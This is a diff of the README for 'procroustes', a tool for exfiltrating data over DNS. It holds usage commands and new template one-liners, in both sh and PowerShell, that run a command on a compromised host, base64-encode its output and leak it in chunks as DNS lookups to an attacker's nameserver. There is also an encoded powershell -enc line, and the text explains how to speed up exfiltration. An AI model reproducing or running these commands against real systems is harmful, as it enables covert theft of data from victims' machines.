@@ -28,7 +28,7 @@ powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsA
 ## Usage
 1. Local testing for bash:
 ```bash
-./prokroustes_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
+./procroustes_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
 ```
 
 Contents of local_bash.sh:
@@ -36,7 +36,7 @@ Contents of local_bash.sh:
 
 2. Local testing for powershell with WSL2:
 ```bash
-stdbuf -oL tcpdump --immediate -l -i any udp port 53|./prokroustes_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
+stdbuf -oL tcpdump --immediate -l -i any udp port 53|./procroustes_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
 ```
 
 Contents of local_powershell_wsl2.sh:
@@ -44,7 +44,7 @@ Contents of local_powershell_wsl2.sh:
 
 3. powershell example where we ssh into our NS to get the incoming DNS requests.
 ```bash
-./prokroustes_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
+./procroustes_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
 ```
 
 Contents of dispatcher.sh
@@ -52,21 +52,43 @@ Contents of dispatcher.sh
 
 4. More information on the options
 ```bash
-./prokroustes_chunked.sh --help
+./procroustes_chunked.sh --help
 ```
 
-### Comparison
+### procroustes_chunked vs procroustes_full
 
-|                       | prokroustes_chunked                | prokroustes_full  |
+|                       | procroustes_chunked                | procroustes_full  |
 | -------------         |:-------------:               |:-----:         |
-| payload size overhead (sh/powershell) | 160\*NLABELS/500\*NLABELS                      | 315/740        |
+| payload size overhead (sh/powershell) | 150\*NLABELS/500\*NLABELS                      | 300/750        |
 | dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[1] |   1👌          |
 | speed (sh/powershell)[2]                | ✔/✔                         |  ✔/😔         |
 
-[1] On prokroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
+[1] On procroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
 A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.
 
-[2] We can speed up the exfiltration process by having the NS properly responding to the requests received. This is especially usefull in the case of prokroustes_full/powershell
+[2] We can speed up the exfiltration process by having the NS properly responding to the requests received. This is especially usefull in the case of procroustes_full/powershell
+
+---------------------------------------
+
+Some of their differences can be illustrated through the template commands used for sh/powershell:
+
+procroustes_chunked/sh:
+```bash
+%DNS_TRIGGER% `(%CMD%)|base64 -w0|cut -b$((%INDEX%+1))-$((%INDEX%+%COUNT%))'`.%UNIQUE_DNS_HOST%
+```
+procroustes_full/sh:
+```bash
+((%CMD%);printf '\n%SIGNATURE%')|base64 -w0|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf "%s.%s%s\n",$2,$1,"%UNIQUE_DNS_HOST%"}'|xargs -P%THREADS% -n1 %DNS_TRIGGER%
+```
+
+procroustes_chunked/powershell:
+```bash
+%DNS_TRIGGER% $("{0}.{1}{2}" -f ([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((%CMD%))).Substring(%INDEX%,%COUNT%)),"%STAGE_ID%","%UNIQUE_DNS_HOST%")
+```
+procroustes_full/powershell:
+```bash
+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((%CMD%)+(echo "`n%SIGNATURE%"))) -split '(.{1,%CHUNK_SIZE%})'|?{$_}|%{$i+=1;%DNS_TRIGGER% $('{0}{1}{2}' -f ($_ -replace '(.{1,%LABEL_SIZE%})','$1.'),$i,'%UNIQUE_DNS_HOST%')}
+```
 
 ### Todos
- - prokroustes_full's powershell command can use some parallelization
+ - procroustes_full/powershell command can use some parallelization.
